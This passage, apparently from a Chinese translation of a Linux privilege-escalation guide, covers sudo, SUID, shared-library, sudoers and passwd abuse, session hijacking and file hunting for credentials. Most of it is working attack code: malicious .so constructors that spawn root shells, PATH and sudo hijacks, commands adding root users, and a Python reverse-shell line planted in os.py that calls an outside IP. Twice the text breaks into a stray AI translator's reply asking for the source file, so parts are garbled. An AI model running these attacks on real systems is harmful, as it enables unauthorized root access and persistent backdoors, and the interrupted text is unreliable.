- 要求：
- 你可以运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 存在于 `env_keep`（可使用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 硬化:
- 从 `env_keep` 中移除 `BASH_ENV`（和 `ENV`），优先使用 `env_reset`。
- 避免为 sudo 允许的命令使用 shell 包装器；使用最小化的二进制文件。
- 考虑在保留环境变量被使用时对 sudo 的 I/O 进行记录和告警。

### Sudo 执行绕过路径

**Jump** 去读取其他文件或使用 **symlinks**。例如在 sudoers 文件中: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更容易:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 未指定命令路径

如果将 **sudo permission** 授权给单个命令且**未指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
该技术也可以用于如果一个 **suid** 二进制 **在未指定其路径的情况下执行另一个命令（始终使用** _**strings**_ **检查可疑 SUID 二进制的内容））。**

[Payload examples to execute.](payloads-to-execute.md)

### SUID 二进制与命令路径

如果 **suid** 二进制 **以指定路径执行另一个命令**，那么你可以尝试 **导出一个函数**，其名称与 suid 文件所调用的命令相同。

例如，如果一个 suid 二进制调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并将其导出：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid binary 时，该函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

但是，为了维护系统安全并防止此特性被滥用，特别是在 **suid/sgid** 可执行文件的情况下，系统会强制执行若干限制：

- 当可执行文件的真实用户 ID (_ruid_) 与有效用户 ID (_euid_) 不匹配时，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且同时具有 suid/sgid 的库会被预加载。

如果你能够使用 `sudo` 执行命令，且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD**，则可能发生提权。该配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时得以保留并被识别，可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**escalate privileges** 正在运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** 环境变量，就可以滥用类似的 privesc，因为他控制了库被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来不寻常的 binary 时，最好验证它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，说明存在可以被 exploit 的潜在可能。

要对其进行 exploit，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，并写入以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过修改文件权限并执行一个提升权限的 shell 来提升权限。

将上述 C 文件编译为共享对象 ( .so ) 文件，使用：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应该会触发 exploit，从而可能导致系统被攻破。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们发现了一个会从我们可写目录加载库的 SUID 二进制文件，接下来在该目录中创建具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要有一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个整理好的 Unix binaries 列表，记录了可以被攻击者利用以绕过本地安全限制的二进制程序。[**GTFOArgs**](https://gtfoargs.github.io/) 与之类似，但用于只能在命令中**注入参数**的场景。

该项目收集了 Unix 二进制的合法功能，这些功能可以被滥用以逃离受限 shell、提升或维持提升的权限、传输文件、spawn bind and reverse shells，并便利其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，你可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找到利用任何 sudo 规则的方法。

### Reusing Sudo Tokens

在你有 **sudo access** 但不知道密码的情况下，你可以通过**等待 sudo 命令执行然后劫持会话令牌**来提升权限。

提升权限的前提条件：

- 你已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 在**最近 15 分钟**内使用过 `sudo` 来执行某些操作（默认情况下这是 sudo 令牌允许我们在不输入密码的情况下使用 `sudo` 的时长）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的输出为 0
- `gdb` 可用（你能够上传它）

(你可以临时启用 `ptrace_scope`：`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`，或通过永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0`)

如果满足上述所有条件，**你可以使用：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) 来提升权限

- 第一个 **exploit**（`exploit.sh`）会在 _/tmp_ 中创建名为 `activate_sudo_token` 的二进制文件。你可以使用它来**在你的会话中激活 sudo 令牌**（你不会自动得到一个 root shell，执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit** (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 sh shell，**由 root 拥有且带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit** (`exploit_v3.sh`) 会 **创建一个 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**。
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或该文件夹内任意已创建的文件具有 **写权限**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **为某个用户和 PID 创建 sudo 令牌**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_ 并且你以该用户身份拥有 PID 为 1234 的 shell，你可以**获得 sudo 权限**而无需知道密码，执行：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 内的文件配置了谁可以使用 `sudo` 以及如何使用。 这些文件 **默认只能被用户 root 和组 root 读取**。\
**如果** 你可以 **读取** 这个文件，你可能能够 **获取一些有趣的信息**，而如果你可以 **写入** 任意文件，你将能够 **提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你能写入，你就可以滥用这个权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些 `sudo` 二进制替代品，例如用于 OpenBSD 的 `doas`，记得检查其配置文件位于 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个**用户通常连接到一台机器并使用 `sudo`** 来提升权限，且你已经在该用户上下文获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，该文件会以 root 身份先执行你的代码然后再执行用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会先执行你创建的 sudo 可执行文件。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件来添加新的路径。例如 [ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似下面的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自哪里**。通常，这个文件包含如下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。该配置文件 **指向其他文件夹**，系统会在这些文件夹中 **搜索库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果出于某种原因 **用户对所示路径拥有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任何文件，或 `/etc/ld.so.conf.d/*.conf` 中配置指向的任何文件夹，他可能能够提升权限。\
在下面的页面中查看 **如何利用该错误配置**：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，程序将按 `RPATH` 变量中指定的位置使用它。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 创建一个恶意库。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 特权能力

Linux capabilities 向进程提供可用 root 特权的一个子集。**这会将 root 的特权拆分为更小且独立的单元**。每个单元都可以独立地授予给进程。通过这种方式，授予的完整特权集被减少，从而降低被利用的风险。\
阅读下列页面以**了解更多关于 capabilities 以及如何滥用它们**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**标记为 "execute" 的位** 表示受影响的用户可以 **"cd"** 进入该文件夹。\
**"read"** 位表示用户可以 **列出** **files**，而 **"write"** 位表示用户可以 **删除** 和 **创建** 新 **files**。

## ACLs

Access Control Lists (ACLs) 表示可裁量权限的第二层，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对特定非所有者或非组成员用户的权限来增强对文件或目录访问的控制。此级别的**细粒度确保更精确的访问管理**。更多详情见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**给** 用户 "kali" 赋予对文件的 read 和 write 权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，你可能可以 **hijack** 不同用户（**root**）的某些 **shell** 会话。\
在 **最新版本** 中，你将只能 **连接** 到属于 **你自己的用户** 的 screen sessions。不过，你可能会在会话中发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是**旧的 tmux 版本**的问题。我无法以非特权用户身份劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
查看 **Valentine box from HTB** 作为示例。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月到2008年5月13日期间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受此漏洞影响。  
该漏洞发生在这些操作系统生成新的 ssh 密钥时，原因是 **只有 32,768 种变体**。这意味着所有可能性都可以被穷举，并且 **拥有 ssh 公钥即可搜索对应的私钥**。  
你可以在此找到预计算的可能性： [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 有趣的配置项

- **PasswordAuthentication：** 指定是否允许密码认证。默认值为 `no`。
- **PubkeyAuthentication：** 指定是否允许公钥认证。默认值为 `yes`。
- **PermitEmptyPasswords：** 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认值为 `no`。

### PermitRootLogin

指定 root 是否可以使用 ssh 登录，默认值为 `no`。可选值：

- `yes`：root 可以使用密码和私钥登录
- `without-password` 或 `prohibit-password`：root 只能使用私钥登录
- `forced-commands-only`：root 仅能使用私钥登录，且必须指定 commands 选项
- `no`：不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的 token（将被替换为用户主目录）。**可以指定绝对路径**（以 `/` 开头）或**相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示如果你尝试使用用户“**testusername**”的**private** key 登录，ssh 会将你的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的条目进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys**（不要在服务器上留置没有 passphrases 的 keys！）。因此，你可以通过 ssh **jump** 到一个 **host**，然后从那里使用位于你 **initial host** 的 **key** **jump** 到另一个 **host**。

你需要在 `$HOME/.ssh.config` 中像下面这样设置该选项：
```
Host example.com
ForwardAgent yes
```
注意：如果 `Host` 是 `*`，每次用户跳到不同的机器时，该主机都将能够访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝该配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent forwarding（默认允许）。

如果你发现环境中配置了 Forward Agent，请阅读下列页面，因为 **你可能能够滥用它来提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 相关文件

### 配置文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是**在用户启动新 shell 时执行的脚本**。因此，如果你能够**写入或修改其中的任何一个文件，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何可疑的配置文件脚本，应检查其中是否有**敏感信息**。

### Passwd/Shadow 文件

根据操作系统，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称或存在备份。因此建议**查找所有这些文件**并**检查是否可读取**，以查看文件中**是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下面的其中一个命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我没有收到 src/linux-hardening/privilege-escalation/README.md 的内容。请把该文件的文本粘贴过来，我会把其中的英文翻译成中文并保留所有 markdown/HTML 标签、路径和代码不被翻译。

另外，请确认以下两点：
- 你希望我在翻译的文档里以怎样的形式“添加用户 `hacker` 并添加生成的密码”？（例如：添加一段命令示例（useradd / passwd 命令）还是在文档中插入一行说明和密码）
- 我可以为你生成一个安全密码并把它写入翻译文档，但我不能在你的系统上实际创建用户或设置密码——我只能提供要运行的命令或文档说明。是否现在就生成密码？如果是，请确认密码复杂度（长度，是否包含符号等）。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令，以 `hacker:hacker` 登录

或者，你可以使用以下几行来添加一个无密码的虚拟用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以 **写入某些敏感文件**。例如，你能否写入某个 **服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器并且你可以 **修改 /etc/systemd/ 中的 Tomcat 服务配置文件，** 那么你可以修改以下几行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 会在下次启动 tomcat 时被执行。

### 检查文件夹

以下文件夹可能包含备份或有用的信息： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (你可能无法读取最后一个，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
我没有收到 src/linux-hardening/privilege-escalation/README.md 的内容。请粘贴该文件的内容（保留原有的 Markdown/HTML 标签、路径和代码块），我会把英文翻译为中文。
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **可能包含密码的若干文件**。\
**另一个有趣的工具** 是: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) 这是一个开源应用，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，你可能会在其中找到 **有趣/机密的信息**。日志越异常，可能越有价值（大概）。\
另外，一些“**配置不当的**”（被植入后门？）**审计日志** 可能允许你在审计日志中 **记录密码**，如这篇文章所述： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了读取日志，组 [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用 Creds Search/Regex

你还应该检查文件名或内容中包含单词 "**password**" 的文件，也要在日志中检查 IPs 和 emails，或 hashes regexps。\
我不会在这里列出如何执行所有这些操作，但如果你感兴趣你可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最新检查。

## 可写文件

### Python library hijacking

如果你知道 **where** 一个 python 脚本将被执行并且你 **can write inside** 那个文件夹或你可以 **modify python libraries**，你可以修改 OS 库 并 backdoor it（如果你可以写入 python 脚本将被执行的位置，复制并粘贴 os.py 库）。

要 **backdoor the library**，只需在 os.py 库末尾添加以下行（更改 IP and PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 漏洞利用

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **write permissions** 的用户可能获得提权。因为 `logrotate`，通常以 **root** 身份运行，可以被操纵以执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅要检查 _/var/log_ 中的权限，还要检查任何应用了日志轮换的目录。

> [!TIP]
> 该漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于该漏洞的更多详细信息请见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** 非常相似， 因此每当你发现可以修改日志时，检查谁在管理这些日志，并检查是否可以通过将日志替换为符号链接来提升权限。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果由于某种原因，用户能够向 _/etc/sysconfig/network-scripts_ 写入一个 `ifcf-<whatever>` 脚本，或 **adjust** 已有脚本，则你的 **system is pwned**。

Network scripts（例如 _ifcg-eth0_）用于网络连接。它们看起来完全像 .INI files。然而，它们在 Linux 上被 Network Manager (dispatcher.d) \~sourced\~。

在我的案例中，这些 network scripts 中的 `NAME=` 属性未被正确处理。如果名称中有 **空白/空格，系统会尝试执行空白/空格之后的部分**。这意味着 **第一个空格之后的所有内容都会以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 是 System V init (SysVinit) 的 **脚本** 存放位置，SysVinit 是经典的 Linux 服务管理系统。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或通过位于 `/etc/rc?.d/` 的符号链接来执行。Redhat 系统的替代路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 Upstart 相关，Upstart 是 Ubuntu 引入的新型服务管理，使用配置文件来管理服务任务。尽管已转向 Upstart，但由于 Upstart 中的兼容层，SysVinit 脚本仍与 Upstart 配置同时使用。

systemd 作为现代的初始化和服务管理器出现，提供按需启动守护进程、自动挂载管理和系统状态快照等高级功能。它将文件组织到 `/usr/lib/systemd/`（用于发行版包）和 `/etc/systemd/system/`（供管理员修改），从而简化系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 常通过 hook 一个 syscall 将特权内核功能暴露给 userspace 管理器。薄弱的管理器认证（例如基于 FD-order 的签名校验或糟糕的密码方案）可能允许本地应用模拟该管理器，从而在已被 root 的设备上升级为 root。了解更多及利用细节请见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
